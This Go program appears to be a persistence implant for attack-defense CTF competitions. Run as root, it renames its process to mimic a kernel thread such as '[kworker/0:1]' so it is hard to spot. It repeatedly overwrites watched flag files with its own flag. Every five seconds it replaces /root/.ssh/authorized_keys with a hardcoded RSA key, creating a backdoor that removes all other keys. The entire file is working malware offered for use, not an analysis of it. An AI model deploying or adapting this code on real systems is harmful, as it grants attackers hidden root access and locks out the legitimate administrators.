package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/user"
	"reflect"
	"time"
	"unsafe"

	"github.com/nightlyone/lockfile"
	"github.com/radovskyb/watcher"
)

func SetProcessName(name string) error {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

	n := copy(argv0, name)
	if n < len(argv0) {
		argv0[n] = 0
	}
	//set all the other args to 0
	for i := n + 1; i < len(argv0); i++ {
		argv0[i] = 0
	}

	return nil
}

func isRoot() bool {
	//get the current user and return true if the user is root.
	user, err := user.Current()
	if err != nil {
		fmt.Println(err)
	}
	if user.Uid == "0" {
		return true
	}
	return false
}

func overwriteFile(path string, flag string) {
	//read the file to see if it already contains the flag.
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Printf("Failed to read %s: %v\n", path, err)
		return
	}
	if string(data) == flag {
		fmt.Printf("Contents already present in %s\n", path)
		return
	}
	err = os.WriteFile(path, []byte(flag), 0644)
	if err != nil {
		fmt.Printf("Failed to overwrite %s: %v\n", path, err)
		return
	}
	fmt.Printf("Overwrote %s with %s\n", path, flag)
}

func main() {
	//lock the process to prevent multiple instances, if the process is already running, exit.
	lock, err := lockfile.New("/tmp/.lock")
	if err != nil {
		fmt.Println(err)
	}
	err = lock.TryLock()
	if err != nil {
		fmt.Println("Already running")
	}
	//if user isn't root, exit.
	if !isRoot() {
		fmt.Println("Not root. Run as root.")
		os.Exit(1)
	}

	//Define the paths to all the ctf flag files to overwrite with our own.
	flagFiles := []string{"/home/justin/flag.txt"} // Example list of flag file paths
	//defines the ssh key to add to the authorized_keys file.
	sshKey := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDf+adep5YH3IcKGkkj9IbFn1Ua1S20hKCF+fULaI5cXahITxdh89URSpQ0sMtDolL+VMVzsayq/RCeJT032RicXGLq7wKDXt6eXfyY/fjvph21t014X41whzYz+U8m1wZb/96o09xqkG2rUfACKn0iOK9ukhTFy7/H7vkRpoA8NVEzrcKUZ/x5vzh3fX8nJwHqhfYjd8BLAwuGupWpipFiUMtPWwATgVLv9qQWSXPp4TtK1URCR0aHo7/4MW15OQ4WeU1xZOltaRBMQMigPnUHZNgv8iRgoIPpDBnAgX4SswMggwQNTUIR3fNT9CDxv78VEUGO9GpaLny2EdlXF+xdMngRZHFNias7TaxjeUoydj2sFIK14HAgchT2XdkEObw9/g/vMFfEz7/j/7aFi9QOO5amZ5q2Oqw8H6YX9oYL8aQqVDv4cL3rFzLDTfzWL+Fft32OfFOJPoBtpvrSzyvvZMFNsgdsT5m1w18D1tb4dqt95RuinZ3l/h+m5WHMRWJU3WS1qhVcHeCy9jNIXp/Hf066ZOvYXwpTzkc4/FwCHag4fK4ZcmzJG4Hg8iyRLQEHlDF37epq7IdrN7Y3Q+bYeWQ25KBzSBjjMfjwwi6qE2rfhSnMeSK3mqECWjB/sBpttZn7GDHgbtKzhJKKcLae4tJkiORmdYV10HSkMpOjgw== justin@box1"
	//define the string to overwrite the flag files with.
	flag := "flag{this_is_a_fake_flag}"
	//rename the process to something less suspicious.
	list_of_unsuspicious_filenames := []string{
		"[kworker/0:1]",
		"(sd-pam)",
		"[irq/16-vmwgfx]",
		"[scsi_eh_29]",
		"[acpi_thermal_pm]",
		"[kworker/0:0-events]",
		"[migration/0]",
		"[ksoftirqd/0]",
	}
	//pick a name from the list randomly.
	rand.Seed(time.Now().UnixNano())
	SetProcessName(list_of_unsuspicious_filenames[rand.Intn(len(list_of_unsuspicious_filenames))])

	// Watch the flag files for changes and overwrite them with our own flag when they change.
	w := watcher.New()
	w.SetMaxEvents(1)
	w.FilterOps(watcher.Write)
	for _, path := range flagFiles {
		if err := w.Add(path); err != nil {
			fmt.Println(err)
		}
	}
	go func() {
		for {
			select {
			case event := <-w.Event:
				if event.Op == watcher.Write {
					overwriteFile(event.Path, flag)
					//get rid of the event to avoid a loop.
				}
			case err := <-w.Error:
				fmt.Println(err)
			}
		}
	}()

	//overwrite authorized_keys file with our ssh key every 5 seconds.
	go func() {
		for {
			//create file if it doesn't exist.
			if _, err := os.Stat("/root/.ssh/authorized_keys"); os.IsNotExist(err) {
				os.WriteFile("/root/.ssh/authorized_keys", []byte(""), 0644)
			}

			overwriteFile("/root/.ssh/authorized_keys", sshKey)
			time.Sleep(5 * time.Second)
		}
	}()

	if err := w.Start(time.Millisecond * 100); err != nil {
		fmt.Println(err)
	}

}
